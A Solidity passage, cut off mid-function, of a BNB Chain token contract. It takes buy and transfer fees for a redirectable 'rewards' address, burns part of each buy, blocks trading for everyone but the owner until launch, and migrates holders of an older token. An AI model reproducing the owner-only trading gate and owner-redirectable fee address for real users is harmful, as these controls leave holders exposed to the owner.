interface Irewards{
    function rewards2token() external;
}

contract token is Context, IERC20, IERC20Metadata {
    mapping (address => bool) public isExcludedFromFee;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;


    string private _name;
    string private _symbol;



    address public marketing_address = 0x0Fc75d3408Df27eFf1FbF38aeAc2E1D749631236;
    address public buyer_address = 0x787E515DeFCD20fB2629d339a2a6B92771350Bb0;
    address public rewards_address = 0x787E515DeFCD20fB2629d339a2a6B92771350Bb0;
    address public usdt_address = 0x55d398326f99059fF775485246999027B3197955;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public owner;

    mapping(address => uint256) private _balances;
    mapping(address => bool) public upgrade_users;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    bool public is_start = false;
    bool public is_upgrade = true;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, 1000 * 100000000 * 1e18);
        owner = payable(msg.sender);

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), usdt_address);

        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[address(0)] = true;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "only owner");
        _;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal  {
        if(from == address(0) || to == address(0))
            return;
        if(is_start == false)
        {
            require(from == owner || to == owner,"not start");
        }
    }

    function _afterTokenTransfer(address from,
        address to,
        uint256 amount) internal  {
        if(from == address(0) || to == address(0)
        || from == owner || to == owner
        )
            return;
        if(isExcludedFromFee[from] || isExcludedFromFee[to])
            return;
        if(_totalSupply < 100000000 * 1e18)
            return;
        //买入
        if(from == uniswapPair){

            _standardtransfer(to, rewards_address, amount* 6 /100);//护盘
            _standardtransfer(to, burnAddress, amount/50);//黑洞
        }
        else {
            
            _standardtransfer(to, rewards_address, amount*12/100);//护盘
        }
        if(_balances[rewards_address] > 1000*10000*1e18){
            Irewards(rewards_address).rewards2token();
        }
    }

    function upgrade() public{
        upgrade_to(msg.sender);
    }

    function upgrade_more(address[] memory  address_array) public {
        for(uint256 i;i<address_array.length;i++)
        {
            upgrade_to(address_array[i]);
        }

    }

    function upgrade_to(address account) public{
        require(is_upgrade);//需要开启升级
        require(!upgrade_users[account]);
        uint256 token_amount = IERC20(0x7334a47a90d74a804BA971100E4741531672191E).balanceOf(account);
        upgrade_users[account] = true;
        _standardtransfer(owner, account, token_amount);
    }

    //暂停升级
    function stop_upgrade() public{
        require(msg.sender == owner);
        require(is_upgrade);
        is_upgrade = false;
    }

    function set_rewards_address(address account) public onlyOwner {
        rewards_address = account;
